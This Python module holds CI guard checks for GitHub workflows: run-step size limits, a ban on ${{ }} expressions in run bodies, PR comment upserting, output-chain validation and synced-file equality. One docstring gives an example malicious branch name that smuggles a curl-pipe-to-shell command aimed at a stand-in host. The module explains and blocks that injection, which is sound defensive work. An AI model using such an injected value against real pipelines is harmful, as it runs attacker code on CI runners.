def _run_block_bodies(text: str) -> list[tuple[int, str]]:
    """Every `run:` block scalar in a workflow, as (line number, script).

    Hand-rolled rather than PyYAML: this module has no third-party dependency
    and the shape needed is narrow — find `run: |`, take the following lines
    indented past the `run:` key, and dedent them to the script GitHub actually
    runs. A `run:` with an inline value has no block and is skipped; those are
    single commands and can never approach the ceiling.
    """
    out: list[tuple[int, str]] = []
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        match = _RUN_BLOCK_RE.match(lines[i])
        if match is None:
            i += 1
            continue
        key_indent = len(match.group("lead"))
        start = i + 1
        body: list[str] = []
        i += 1
        while i < len(lines):
            line = lines[i]
            if line.strip() and len(line) - len(line.lstrip()) <= key_indent:
                break
            body.append(line)
            i += 1
        while body and not body[-1].strip():
            body.pop()
        widths = [len(b) - len(b.lstrip()) for b in body if b.strip()]
        cut = min(widths) if widths else 0
        out.append((start, "\n".join(b[cut:] if b.strip() else "" for b in body)))
    return out


def check_workflow_step_sizes(inv: Inventory) -> list[str]:
    """No `run:` step may be large enough to stop the workflow from starting.

    Same failure mode as check_workflow_actions_trusted, reached a different
    way: over the size ceiling GitHub rejects the workflow at startup, so no
    job is created, no check run is published, and the workflow's absence from
    the check list reads as "nothing to report" rather than as a failure. Both
    of two pull requests merged-ready with all of ci.yml silently missing and four
    unrelated green checks showing, which is how this was found.

    Nothing else catches it. actionlint exits 0, the file is valid YAML, and
    every other guard in this module passes — the workflow is well-formed, just
    too big in one place to run.
    """
    problems: list[str] = []
    for rel in inv.group_paths(inv.workflow_surface_groups):
        path = inv.root / rel
        if not path.is_file():
            continue  # check_declared_paths_exist owns missing files
        for lineno, body in _run_block_bodies(path.read_text()):
            size = len(body.encode())
            if not body.strip():
                # Either a genuinely empty step, or this extractor lost the
                # body. Both must be loud: an unmeasured step is a guard that
                # reports OK over nothing, which is the failure this repository
                # refuses everywhere else.
                problems.append(
                    f"{rel}:{lineno}  `run:` block scalar has an empty body, so "
                    f"its size cannot be measured. Give the step a body, or fix "
                    f"the indentation that hid it."
                )
                continue
            if size <= STEP_RUN_BUDGET_BYTES:
                continue
            problems.append(
                f"{rel}:{lineno}  `run:` body is {size} B, over the "
                f"{STEP_RUN_BUDGET_BYTES} B budget. A step this large risks "
                f"GitHub refusing the workflow at startup, which publishes no "
                f"check run at all — the workflow goes silently absent from the "
                f"check list instead of red. Split it into several steps, or "
                f"move the body into a script under scripts/ and call that."
            )
    return problems


_EXPRESSION_RE = re.compile(r"\$\{\{\s*(?P<expr>.*?)\s*\}\}")


def check_run_expressions(inv: Inventory) -> list[str]:
    """No `${{ }}` expression may appear inside a `run:` body.

    GitHub substitutes an expression into the script text before the shell
    parses it, so the value becomes shell source, not an argument. Quoting does
    not help: `"${{ github.ref_name }}"` with a branch named
    `x";curl${IFS}evil.sh|sh;"` closes the quote itself. Git refuses spaces in a
    ref name but not `$`, `(`, `;`, `|` or a backtick, and the reusable
    workflows splice consumer `inputs.*` the same way. This is the GitHub half of
    the rule check_value_interpolation already holds the ADO templates to.

    The rule is absolute rather than an allowlist of "safe" contexts: deciding
    which context is attacker-shaped is the judgement that let `ref_name`
    through, and every value has a safe route anyway. The `github.*` values
    the steps need are already in the environment as GITHUB_SHA,
    GITHUB_REF_NAME, GITHUB_SERVER_URL, GITHUB_REPOSITORY and GITHUB_RUN_ID;
    anything else goes through the step's `env:` mapping and is read as
    "$NAME".
    """
    groups = tuple(inv.workflow_surface_groups)
    if "templates" in inv.surface_groups:
        groups += ("templates",)
    problems: list[str] = []
    for rel in inv.group_paths(groups):
        path = inv.root / rel
        if not path.is_file() or path.suffix not in (".yml", ".yaml"):
            continue  # check_declared_paths_exist owns missing files
        text = path.read_text()
        for lineno, body in _run_block_bodies(text) + _run_inline_commands(text):
            for expr in sorted({m.group("expr") for m in _EXPRESSION_RE.finditer(body)}):
                problems.append(
                    f"{rel}:{lineno}  `run:` body splices ${{{{ {expr} }}}} into "
                    f"shell source. GitHub substitutes it before the shell parses "
                    f"the line, so a value carrying a quote, `$(` or a backtick "
                    f"runs as code. Pass it through the step's env: mapping and "
                    f'read it as "$NAME" (github.* values are already GITHUB_* '
                    f"variables)."
                )
    return problems


# `gh pr comment` appends unconditionally, so a workflow that posts its verdict
# that way leaves one comment per push and a reader has to work out which of
# them is live from the Commit row. notify already solves this — buildMarkdown
# renders PipelineMarker() as line 1 and upsertGitHubComment PATCHes the comment
# carrying it — but the reusable workflows post comment.md from the runner
# rather than calling the module, so the marker was rendered and then thrown
# away. Measured on one of this repository's pull requests: three comments, one per push, all
# three carrying the identical `<!-- cicd-pipeline:precommit -->`.
#
# The remedy cannot live in a shared script. A reusable workflow runs against
# the CALLER's checkout, so scripts/ci/ is simply not on disk when precommit.yml
# runs in a consumer repository — the step body has to be inline, and therefore
# copied per workflow that posts. That is the drift this check holds: every
# poster must upsert, and every poster must do it the same way.
#
# Neither half fails loudly on its own. A poster that regresses to append-only
# still posts, and a copy that drifts still posts; the symptom is a thread that
# slowly fills with stale verdicts, which is what it looked like before.
PR_COMMENT_APPEND = "gh pr comment"
PR_COMMENT_UPSERT = "issues/comments/"

# An inline `run:` is how the append-only step was written, so a check reading
# only block scalars would miss a revert to exactly the shape it exists to
# refuse — and would then report nothing rather than reporting a poster that
# cannot upsert, because a one-line command has nowhere to put the lookup.
_INLINE_RUN_RE = re.compile(r"^\s*(?:-\s+)?run:\s*(?![|>])(?P<script>\S.*)$")


def _run_scripts(text: str) -> list[tuple[int, str]]:
    """Every `run:` script in a workflow — block scalars and inline alike."""
    scripts = list(_run_block_bodies(text))
    for lineno, line in enumerate(text.splitlines(), start=1):
        match = _INLINE_RUN_RE.match(line)
        if match:
            scripts.append((lineno, match.group("script").strip()))
    return sorted(scripts)


def check_pr_comment_upsert(inv: Inventory) -> list[str]:
    """Every workflow that posts a PR comment must update one, identically."""
    problems: list[str] = []
    posters: list[tuple[str, int, str]] = []
    for rel in inv.group_paths(inv.workflow_surface_groups):
        path = inv.root / rel
        if not path.is_file():
            continue
        for lineno, body in _run_scripts(path.read_text(encoding="utf-8")):
            if PR_COMMENT_APPEND in body:
                posters.append((rel, lineno, body))

    if not posters:
        # The vacuous pass this repository keeps re-learning: a sweep that found
        # nothing to check is not a repository that passed. If the comment step
        # was removed on purpose, remove this check with it.
        return [
            "no workflow step posts a PR comment, so there is nothing to hold to "
            "the upsert rule. A check with an empty subject defends nothing — "
            "if the verdict comment was removed deliberately, remove "
            "check_pr_comment_upsert with it rather than leaving it green."
        ]

    for rel, lineno, body in posters:
        if PR_COMMENT_UPSERT not in body:
            problems.append(
                f"{rel}:{lineno}  posts a PR comment but never PATCHes "
                f"{PR_COMMENT_UPSERT}<id>, so it appends a new comment on every "
                f"push instead of updating the one carrying notify's pipeline "
                f"marker. The thread fills with stale verdicts and nothing says "
                f"which is live."
            )

    first_rel, first_line, first_body = posters[0]
    for rel, lineno, body in posters[1:]:
        if body != first_body:
            problems.append(
                f"{rel}:{lineno}  posts a PR comment differently from "
                f"{first_rel}:{first_line}. A reusable workflow cannot source "
                f"this from scripts/ci/ — it runs against the caller's checkout "
                f"— so the copies must stay byte-identical or one pipeline's "
                f"comments quietly behave differently from another's."
            )
    return problems


# The set of language names `--include` accepts is carried in two places that can
# be enforced independently: `languageAliases` in src/quality/include.go, which is
# the module boundary, and a `case` pattern in .github/workflows/precommit.yml,
# which refuses a bad value before Dagger is provisioned. The guard predates the
# module error (it was added as a patch over the hole that let `--include golang`
# scan nothing and report the quality gate as passed), and both are worth keeping:
# the guard fails in a second at the workflow boundary, the module error covers
# every direct `dagger call` and commit.yml.
#
# But two copies of a list is this repository's recurring defect — `.slnx` was
# missing from two of three marker lists for exactly as long as nothing tested the
# pair together — and this pair fails in a nastier direction than a stale document:
# a name the guard accepts and the module refuses turns a consumer's valid-looking
# input into a hard pipeline error, while a name the guard refuses and the module
# accepts makes the reusable workflow reject an input that works everywhere else.
_ALIAS_ENTRY_RE = re.compile(r'^\s*"(?P<alias>[^"]+)":\s*"(?P<target>[^"]+)",\s*$')
_GUARD_CASE_RE = re.compile(r"^\s*(?P<pattern>[a-z0-9|'#.\-]+)\)\s*;;\s*$")

INCLUDE_ALIAS_SOURCE = "src/quality/include.go"
INCLUDE_GUARD_WORKFLOW = ".github/workflows/precommit.yml"


def _module_include_names(root: pathlib.Path) -> tuple[set[str], list[str]]:
    """The --include names src/quality/include.go accepts."""
    path = root / INCLUDE_ALIAS_SOURCE
    try:
        text = path.read_text(encoding="utf-8")
    except OSError as exc:
        return set(), [f"{INCLUDE_ALIAS_SOURCE}: cannot read ({exc})"]

    marker = "var languageAliases = map[string]string{"
    start = text.find(marker)
    if start < 0:
        return set(), [
            f"{INCLUDE_ALIAS_SOURCE}: no `languageAliases` map found, so the "
            f"accepted --include set cannot be compared with the shell guard in "
            f"{INCLUDE_GUARD_WORKFLOW}. Refusing to read that as agreement."
        ]
    names: set[str] = set()
    for line in text[start + len(marker):].splitlines():
        if line.strip().startswith("}"):
            break
        entry = _ALIAS_ENTRY_RE.match(line)
        if entry:
            names.add(entry.group("alias"))
    if not names:
        return set(), [
            f"{INCLUDE_ALIAS_SOURCE}: `languageAliases` parsed to no entries. An "
            f"empty accepted set would refuse every --include value."
        ]
    return names, []


def _guard_include_names(root: pathlib.Path) -> tuple[set[str], list[str]]:
    """The --include names the precommit.yml shell guard accepts."""
    path = root / INCLUDE_GUARD_WORKFLOW
    try:
        text = path.read_text(encoding="utf-8")
    except OSError as exc:
        return set(), [f"{INCLUDE_GUARD_WORKFLOW}: cannot read ({exc})"]

    # The guard is the one `case` arm listing language names. Anchor on a name
    # that must be in any such list rather than on a line number.
    for line in text.splitlines():
        match = _GUARD_CASE_RE.match(line)
        if not match:
            continue
        pattern = match.group("pattern")
        alternatives = {a.strip().strip("'\"").lower() for a in pattern.split("|")}
        if "go" in alternatives and "python" in alternatives:
            return alternatives, []
    return set(), [
        f"{INCLUDE_GUARD_WORKFLOW}: no `case` arm listing the accepted --include "
        f"languages was found. It guarded the input against a name that would "
        f"scan nothing; if it was removed on purpose, remove this check with it "
        f"rather than leaving it reading as agreement."
    ]


def check_include_language_set(inv: Inventory) -> list[str]:
    module_names, problems = _module_include_names(inv.root)
    guard_names, guard_problems = _guard_include_names(inv.root)
    problems = problems + guard_problems
    if problems:
        return problems

    guard_only = sorted(guard_names - module_names)
    module_only = sorted(module_names - guard_names)
    if guard_only:
        problems.append(
            f"{INCLUDE_GUARD_WORKFLOW} accepts --include {', '.join(guard_only)} "
            f"but {INCLUDE_ALIAS_SOURCE} does not, so the workflow would pass an "
            f"input the module refuses with a hard error part-way through a run."
        )
    if module_only:
        problems.append(
            f"{INCLUDE_ALIAS_SOURCE} accepts --include {', '.join(module_only)} "
            f"but the guard in {INCLUDE_GUARD_WORKFLOW} refuses it, so the "
            f"reusable workflow rejects a value that works for every direct "
            f"`dagger call` and for commit.yml."
        )
    return problems


# A reusable workflow's outputs are a three-link chain — workflow_call output →
# job output → step write into $GITHUB_OUTPUT — and GitHub validates none of it:
# a typo'd name at any link resolves to the empty string at run time, silently.
# For the outputs commit.yml and precommit.yml ship, that empty string lands in
# a CALLER's gate (`needs.commit.outputs.passed`), where `'' != 'true'` at least
# fails closed but explains nothing, and `'' != 'false'` in a notify condition
# reads as "not failed". Nothing else looks: actionlint accepts unknown output
# names, and the workflow itself runs green.
_EXPR_JOB_OUTPUT_RE = re.compile(r"\$\{\{\s*jobs\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)\s*\}\}")
_EXPR_STEP_OUTPUT_RE = re.compile(r"\$\{\{\s*steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)\s*\}\}")
_YAML_KEY_RE = re.compile(r"^(\s*)([A-Za-z0-9_-]+):(.*)$")


def _yaml_children(lines: list[tuple[int, str]], key_indent: int) -> list[tuple[int, str, str, list[tuple[int, str]]]]:
    """Direct children of a block, as (lineno, key, inline value, child block).

    Hand-rolled for the same reason as _run_block_bodies: no third-party
    dependency, and the shape needed is narrow — 2-space-indented mappings, the
    only YAML these workflows use. lines are (lineno, text) pairs; children are
    the keys at exactly key_indent, each carrying the deeper lines under it.
    """
    out: list[tuple[int, str, str, list[tuple[int, str]]]] = []
    i = 0
    while i < len(lines):
        lineno, text = lines[i]
        match = _YAML_KEY_RE.match(text)
        if match is None or len(match.group(1)) != key_indent or not text.strip() or text.lstrip().startswith("#"):
            i += 1
            continue
        block: list[tuple[int, str]] = []
        j = i + 1
        while j < len(lines):
            _, deeper = lines[j]
            if deeper.strip() and len(deeper) - len(deeper.lstrip()) <= key_indent:
                break
            block.append(lines[j])
            j += 1
        out.append((lineno, match.group(2), match.group(3).split("#", 1)[0].strip(), block))
        i = j
    return out


def _step_run_writes(block: list[tuple[int, str]]) -> dict[str, str]:
    """Map each step id in a job's `steps:` block to its `run:` body.

    A step without an id cannot be referenced and is skipped; a step with an
    id but no run body (a `uses:` step) maps to the empty string, which the
    caller treats as unverifiable rather than broken — the action's outputs
    are its own contract.
    """
    writes: dict[str, str] = {}
    step_id = ""
    body_lines: list[str] = []
    run_indent = -1
    for _, text in block:
        stripped = text.strip()
        indent = len(text) - len(text.lstrip())
        if run_indent >= 0:
            if not stripped or indent > run_indent:
                body_lines.append(text)
                continue
            run_indent = -1
        if stripped.startswith("- "):
            if step_id:
                writes[step_id] = "\n".join(body_lines)
            step_id, body_lines = "", []
            stripped = stripped[2:]
            indent += 2
        if stripped.startswith("id:"):
            step_id = stripped.split("id:", 1)[1].split("#", 1)[0].strip()
            writes.setdefault(step_id, "")
        elif _RUN_BLOCK_RE.match(text):
            run_indent = indent
    if step_id:
        writes[step_id] = "\n".join(body_lines)
    return writes


def check_workflow_output_chain(inv: Inventory) -> list[str]:
    """Every declared reusable-workflow output must resolve end to end.

    Scoped by content, not by a second manifest list: any declared workflow
    surface containing a `workflow_call:` trigger is a reusable workflow, so a
    new one cannot dodge the check by being forgotten in a list — the same
    reason check-runtime-image-pins discovers From(...) from source.
    """
    problems: list[str] = []
    for rel in inv.group_paths(inv.workflow_surface_groups):
        path = inv.root / rel
        if not path.is_file():
            continue  # check_declared_paths_exist owns missing files
        text = path.read_text()
        if re.search(r"^\s+workflow_call:", text, re.M) is None:
            continue
        numbered = list(enumerate(text.splitlines(), 1))

        # Link 3 first: each job's declared outputs and each step's run body.
        job_outputs: dict[str, dict[str, tuple[int, str]]] = {}
        job_step_writes: dict[str, dict[str, str]] = {}
        for _, key, _, top_block in _yaml_children(numbered, 0):
            if key != "jobs":
                continue
            for _, job_id, _, job_block in _yaml_children(top_block, 2):
                job_outputs[job_id] = {}
                job_step_writes[job_id] = {}
                for _, jkey, _, jblock in _yaml_children(job_block, 4):
                    if jkey == "outputs":
                        for olineno, oname, ovalue, _ in _yaml_children(jblock, 6):
                            job_outputs[job_id][oname] = (olineno, ovalue)
                    elif jkey == "steps":
                        job_step_writes[job_id] = _step_run_writes(jblock)

        # Link 1: workflow_call outputs, wherever workflow_call sits under on:.
        call_outputs: list[tuple[int, str, str]] = []
        for lineno, line in numbered:
            if not re.match(r"^\s+workflow_call:\s*(#.*)?$", line):
                continue
            wc_indent = len(line) - len(line.lstrip())
            wc_block: list[tuple[int, str]] = []
            for lno2, l2 in numbered[lineno:]:
                if l2.strip() and len(l2) - len(l2.lstrip()) <= wc_indent:
                    break
                wc_block.append((lno2, l2))
            for _, wkey, _, wblock in _yaml_children(wc_block, wc_indent + 2):
                if wkey != "outputs":
                    continue
                for olineno, oname, _, oblock in _yaml_children(wblock, wc_indent + 4):
                    value = ""
                    for vlineno, vkey, vvalue, _ in _yaml_children(oblock, wc_indent + 6):
                        if vkey == "value":
                            value = vvalue
                            olineno = vlineno
                    if not value:
                        problems.append(
                            f"{rel}:{olineno}  workflow_call output '{oname}' has no "
                            f"value, so it is the empty string on every run — a "
                            f"caller reading it gets a verdict nobody wrote. Give it "
                            f"a value or remove the declaration."
                        )
                        continue
                    call_outputs.append((olineno, oname, value))

        # Walk the chain.
        for lineno, oname, value in call_outputs:
            for job_id, jout in _EXPR_JOB_OUTPUT_RE.findall(value):
                if job_id not in job_outputs:
                    problems.append(
                        f"{rel}:{lineno}  workflow_call output '{oname}' reads "
                        f"jobs.{job_id}.outputs.{jout}, but no job '{job_id}' exists "
                        f"in this workflow. The expression resolves to an empty "
                        f"string on every run, so a caller reads a verdict nobody "
                        f"wrote — fix the job id or declare the job output."
                    )
                elif jout not in job_outputs[job_id]:
                    problems.append(
                        f"{rel}:{lineno}  workflow_call output '{oname}' reads "
                        f"jobs.{job_id}.outputs.{jout}, but job '{job_id}' declares "
                        f"no output '{jout}'. GitHub resolves the missing name to an "
                        f"empty string instead of failing, so the workflow output is "
                        f"silently empty — declare the job output or fix the name."
                    )
        for job_id, jouts in job_outputs.items():
            for jout, (lineno, value) in jouts.items():
                for step_id, sout in _EXPR_STEP_OUTPUT_RE.findall(value):
                    writes = job_step_writes.get(job_id, {})
                    if step_id not in writes:
                        problems.append(
                            f"{rel}:{lineno}  job '{job_id}' output '{jout}' reads "
                            f"steps.{step_id}.outputs.{sout}, but no step in the job "
                            f"has id '{step_id}'. The output is empty on every run — "
                            f"give the producing step that id or fix the reference."
                        )
                        continue
                    body = writes[step_id]
                    if not body:
                        continue  # a uses: step's outputs are the action's contract
                    if "GITHUB_OUTPUT" not in body or f"{sout}=" not in body:
                        problems.append(
                            f"{rel}:{lineno}  job '{job_id}' output '{jout}' reads "
                            f"steps.{step_id}.outputs.{sout}, but that step's run "
                            f"body never writes '{sout}=' to $GITHUB_OUTPUT, so the "
                            f"output is empty on every run. Write the value in the "
                            f"step (echo \"{sout}=...\" >> \"$GITHUB_OUTPUT\") or "
                            f"fix the name the job output reads."
                        )
        # No reusable workflow here declares zero outputs today; if one ever
        # does legitimately, this stays quiet — absence of outputs is not a
        # broken chain, it is a workflow with nothing to say.
    return problems


# The one way synced copies may legitimately differ, by name. A Dagger module
# imports its own generated SDK as "<go.mod module path>/internal/dagger", so a
# helper that takes a *dagger.File cannot be byte-identical across modules even
# when every line of its logic is. The allowance is narrow on purpose: each
# copy's import of *its own* module's SDK is replaced before comparing, read
# from the go.mod beside it, and nothing else is normalised — a copy importing
# a different module's SDK, or differing by one more byte, still drifts.
SDK_IMPORT_PLACEHOLDER = b'"<module>/internal/dagger"'
SYNCED_ALLOWED_DIFFERENCES = ("", "module-sdk-import")


def _own_sdk_import(inv: Inventory, rel: str) -> bytes | None:
    """The quoted SDK import path of the module that holds rel, or None."""
    go_mod = (inv.root / rel).parent / "go.mod"
    if not go_mod.is_file():
        return None
    for line in go_mod.read_text().splitlines():
        if line.startswith("module "):
            return f'"{line.split()[1]}/internal/dagger"'.encode()
    return None


def check_synced_files(inv: Inventory) -> list[str]:
    """Every declared group of copied files is still byte-identical.

    Dagger modules are isolated, so a helper two modules both need is shared by
    file copy. schema.go has a generator; these do not, which is exactly why the
    equality is asserted rather than assumed — markers.go is the same pattern
    left unchecked, and `.slnx` went missing from two of its three copies for as
    long as nothing tested the pair together.

    A missing copy is a problem, not a skip. A group that silently shrinks to one
    file passes every byte comparison there is left to make.
    """
    problems: list[str] = []
    for reason, paths, may_differ_by in inv.synced_files:
        contents: dict[str, bytes] = {}
        for rel in paths:
            target = inv.root / rel
            if not target.is_file():
                problems.append(
                    f"synced_files: '{rel}' is declared as a synced copy but is not "
                    f"a file. It is one of {len(paths)} copies of the same code "
                    f"({reason}); a group missing a member proves nothing about the "
                    f"members it still has."
                )
                continue
            data = target.read_bytes()
            if may_differ_by == "module-sdk-import":
                own = _own_sdk_import(inv, rel)
                if own is None:
                    problems.append(
                        f"synced_files: '{rel}' may differ by its module's SDK "
                        f"import, but no go.mod with a module line sits beside it, "
                        f"so there is no import to allow ({reason})."
                    )
                    continue
                data = data.replace(own, SDK_IMPORT_PLACEHOLDER)
            contents[rel] = data

        distinct = {digest: rel for rel, digest in
                    ((rel, hashlib.sha256(data).hexdigest()) for rel, data in contents.items())}
        if len(distinct) > 1:
            allowed, restore = "", ""
            if may_differ_by == "module-sdk-import":
                allowed = " apart from each module's own SDK import"
                restore = ", then put back that copy's own SDK import"
            problems.append(
                f"synced_files: {', '.join(sorted(contents))} must be byte-identical"
                f"{allowed} and are not ({reason}). Edit one and copy it over the others — "
                f"`cp {sorted(contents)[0]} {sorted(contents)[1]}`"
                f"{restore} — rather than "
                f"fixing them separately, which is how two copies of the same code "
                f"end up disagreeing about what they do."
            )
    return problems


def check_generated_files(inv: Inventory) -> list[str]:
    """Every declared generated copy still matches what its generator produces.

    This is check_synced_files' blind spot, not a duplicate of it. Equality
    between copies cannot see the drift that actually happens: edit the canonical
    implementation, forget every copy, and the copies stay byte-identical to each
    other while disagreeing with the code they are copies of — the comparison
    passes and reports nothing. That is the `.slnx` failure with the comparison
    pointed at the wrong pair, and the only form of the question that can fail in
    that case is regenerating from the source and diffing.

    A generator that cannot be run is exit-worthy rather than a skip, for the
    reason check-go-format has three answers instead of two: "0 of 0 copies
    differ" is vacuously true over a generator that never executed.
    """
    problems: list[str] = []
    for reason, generator, source, paths in inv.generated_files:
        gen_path = inv.root / generator
        src_path = inv.root / source
        for label, target in (("generator", gen_path), ("source", src_path)):
            if not target.is_file():
                problems.append(
                    f"generated_files: {label} '{target.relative_to(inv.root)}' is "
                    f"declared but is not a file, so the copies it defends "
                    f"({', '.join(paths)}) are checked by nothing."
                )
        if problems:
            continue

        try:
            produced = subprocess.run(
                [sys.executable, str(gen_path), str(src_path)],
                capture_output=True, check=True, cwd=inv.root,
            ).stdout
        except subprocess.CalledProcessError as exc:
            stderr = (exc.stderr or b"").decode(errors="replace").strip()
            problems.append(
                f"generated_files: '{generator}' exited {exc.returncode} and could "
                f"not produce the expected content, so nothing was compared: {stderr}"
            )
            continue

        for rel in paths:
            target = inv.root / rel
            if not target.is_file():
                problems.append(
                    f"generated_files: '{rel}' is declared as generated from "
                    f"'{source}' but is not a file ({reason})."
                )
                continue
            if target.read_bytes() != produced:
                problems.append(
                    f"generated_files: '{rel}' is not what `python3 {generator} "
                    f"{source}` produces ({reason}). Run the sync target rather "
                    f"than editing the copy — an edit to the copy is invisible to "
                    f"the canonical implementation and to every other copy."
                )
    return problems


_RUN_INLINE_RE = re.compile(r"^\s*(?:-\s+)?run:[ \t]*(?![|>&*#\r\n])(?P<cmd>\S.*?)\s*$")


def _run_inline_commands(text: str) -> list[tuple[int, str]]:
    """Every single-line `run:` command in a workflow, as (line number, command).

    _run_block_bodies deliberately skips these — it exists to measure body size
    and an inline command can never approach the ceiling. But a step is a step:
    ci.yml invokes scripts/smoke/commit-shapes.sh three times this way, so a
    check that read only block scalars would report the smoke as never running
    in CI. The `#` exclusion keeps a commented `run:` from counting, for the
    same reason check_evidence_verdict skips comment lines.
    """
    out: list[tuple[int, str]] = []
    for lineno, line in enumerate(text.splitlines(), start=1):
        if line.lstrip().startswith("#"):
            continue
        match = _RUN_INLINE_RE.match(line)
        if match is not None:
            out.append((lineno, match.group("cmd")))
    return out


SMOKE_DIR = "scripts/smoke"
SMOKE_RUNNER = "scripts/smoke-all.sh"

_SMOKES_ARRAY_RE = re.compile(r"^SMOKES=\(\s*$(.*?)^\)\s*$", re.M | re.S)


def _smoke_runner_entries(text: str):
    """The script names in smoke-all.sh's SMOKES array, or None if unparseable.

    Parses the array rather than searching the file, because smoke-all.sh's own
    header names several smoke scripts in prose. A check satisfied by a comment
    mention would be measuring documentation, not what `make smoke` runs — the
    same hole check_evidence_verdict refuses in the ADO templates.
    """
    match = _SMOKES_ARRAY_RE.search(text)
    if match is None:
        return None
    names = []
    for line in match.group(1).splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        entry = line.strip('"').strip("'")
        names.append(entry.split()[0] if entry.split() else entry)
    return names


def check_smoke_scripts_are_wired(inv: Inventory) -> list[str]:
    """Every behavioural smoke must be runnable locally AND run by CI.

    The smokes in scripts/smoke/ call the real composites through Dagger and
    assert on the evidence produced, so they are the only checks that can catch
    a pipeline which still compiles and still loads but has stopped doing
    something. They were CI-only: no make target ran any of them, so the whole
    local sweep could be green over a broken fixture assertion. That is how the
    stage-2/stage-4 break once reached CI instead of the author's terminal.

    Both halves are asserted because either alone fails silently. A smoke absent
    from smoke-all.sh cannot be run before pushing. A smoke absent from every
    workflow is a suite of assertions that never executes anywhere, which reads
    as coverage and is not.
    """
    problems: list[str] = []
    smoke_dir = inv.root / SMOKE_DIR
    if not smoke_dir.is_dir():
        return problems
    scripts = sorted(path.name for path in smoke_dir.glob("*.sh"))
    if not scripts:
        return problems

    runner = inv.root / SMOKE_RUNNER
    if not runner.is_file():
        problems.append(
            f"{SMOKE_DIR}/ holds {len(scripts)} behavioural smoke(s) but {SMOKE_RUNNER} "
            "is missing, so no make target runs any of them and the local sweep "
            "cannot fail on a broken fixture"
        )
        return problems

    entries = _smoke_runner_entries(runner.read_text())
    if entries is None:
        problems.append(
            f"{SMOKE_RUNNER} has no parseable `SMOKES=( ... )` array, so this check "
            "cannot tell which smokes `make smoke` runs. It reports OK over nothing "
            "until the array is readable again."
        )
        return problems

    # CI wiring is read from `run:` bodies only. ci.yml names smoke scripts in
    # prose comments as well, and a commented reference runs nothing.
    ran_in_ci: set[str] = set()
    for rel in inv.group_paths(inv.workflow_surface_groups):
        path = inv.root / rel
        if not path.is_file():
            continue  # check_declared_paths_exist owns missing files
        workflow = path.read_text()
        steps = [body for _lineno, body in _run_block_bodies(workflow)]
        steps += [cmd for _lineno, cmd in _run_inline_commands(workflow)]
        for body in steps:
            for name in scripts:
                if f"{SMOKE_DIR}/{name}" in body:
                    ran_in_ci.add(name)

    for name in scripts:
        if name not in entries:
            problems.append(
                f"{SMOKE_DIR}/{name}  is not in {SMOKE_RUNNER}'s SMOKES array, so "
                "`make smoke` does not run it and it cannot be run before pushing"
            )
        if name not in ran_in_ci:
            problems.append(
                f"{SMOKE_DIR}/{name}  is not invoked by any `run:` step in a declared "
                "workflow, so its assertions never execute in CI"
            )
    for name in sorted(set(entries) - set(scripts)):
        problems.append(
            f"{SMOKE_RUNNER} lists {name}, which does not exist in {SMOKE_DIR}/ — "
            "`make smoke` would fail on a missing script"
        )
    return problems


_SCHEMA_VERSION_CONST = re.compile(
    r'^const (?:SchemaVersion|evidenceSchemaVersion) = "([^"]*)"$', re.M
)
_SCHEMA_JSON_CONST = re.compile(r'"const"\s*:\s*"([^"]*)"')
_EVIDENCE_OUTPUT_SCHEMA = re.compile(r'"outputSchema"\s*:\s*"(evidence-[^"]*)"')
_EVIDENCE_ALLOWLIST_KEY = re.compile(r'^\s*"(evidence-[^"]*)":\s*(?:true|false),?\s*$', re.M)
# A schemaVersion pinned to a version LITERAL, in the shapes CI and the smokes
# write it: d.get('schemaVersion') == '1.0.0', d.get("schemaVersion")=="1.0.0",
# expected_schemaVersion="1.0.0". Deliberately narrow: a mock envelope carrying
# "schemaVersion":"1.0.0" as INPUT is not a claim about the current version, and
# several exist on purpose (nothing in cicd reads the field back, and those
# fixtures prove it).
#
# What this cannot see is an INDIRECT comparison -- a shell test whose left side
# is a command substitution, say. A pattern loose enough to span arbitrary text
# between the field name and the operator matches the mock fixtures too. This
# catches the shapes that were actually in the tree; it is not a proof that no
# literal survives anywhere.
_SCHEMA_VERSION_COMPARISON = re.compile(
    r'schemaVersion["\')\]]*\s*(?:==|!=|=)\s*["\']?([0-9]+\.[0-9]+\.[0-9]+)["\']?'
)

def _present(path: pathlib.Path) -> bool:
    """A file this check can read.

    Not _readable(): that gates on _TEXT_SUFFIXES, which excludes .go because
    it exists for the document-scanning checks. Widening the shared predicate
    would change the input set of every other check in this module, so the
    version check carries its own.
    """
    return path.is_file()


_CANONICAL_SCHEMA = "src/internal/evidence/schema.go"
_CANONICAL_SCHEMA_JSON = "src/internal/evidence/schema.json"
_CONTRACT_ALLOWLIST = "src/cross-cutting/contract/verify.go"


def _version_assertion_files(root: pathlib.Path) -> list[str]:
    """CI workflows and smoke scripts, the files that assert on evidence.

    Discovered rather than listed: a hand-maintained list of files to scan is
    the same defect as a hand-maintained list of version copies, and a new
    workflow would join the repository outside it.
    """
    out = []
    for pattern in (".github/workflows/*.yml", ".github/workflows/*.yaml",
                    "scripts/smoke/*.sh"):
        for path in sorted(root.glob(pattern)):
            out.append(str(path.relative_to(root)))
    return out


# --- the develop wrapper's blind spot ---------------------------------------
# A `dagger call` against a module nothing developed generates that module's SDK
# implicitly, inside the call — outside scripts/ci/dagger-develop.sh, with no
# classification and no retry.
#
# specs/stop-losing-the-port-race.md closed this door for the module each job
# names: a module-fetch fault is retried and named, a build failure is reported
# at once. It did not close it for a *cross-module* call. ci.yml's `src/security`
# cell runs `dagger -m ./src/build call build-archive`, and ./src/build has had
# no develop run against it in that job, so its codegen is unwrapped. Two of
# twelve runs died there — `load package ".": package name is empty` and
# `generate type defs: cannot find default codegen GraphQLMarshaller interface`
# — on commits touching no Go file. Each read as a compile error, neither was
# retried, and one of them cost the v3.8.1 release.
#
# What counts as covered is the module handed to the wrapper *and its dependency
# closure*: `dagger develop` cannot generate a module's bindings without loading
# every module it depends on, so a dependency's codegen runs inside the wrapper
# too and a flake there is retried. A module outside that closure is covered by
# nothing.
#
# Order is respected. A `dagger -m` earlier in the job than the develop that
# would cover it is still a gap, because that call is the one that pays for the
# codegen.
_DEVELOP_CALL_RE = re.compile(r"dagger-develop\.sh\"?\s+\"?(?P<mod>[^\s\"]+)\"?")
_DAGGER_MODULE_RE = re.compile(r"\bdagger\b[^\n]*?\s-m\s+\"?(?P<mod>[^\s\"]+)\"?")
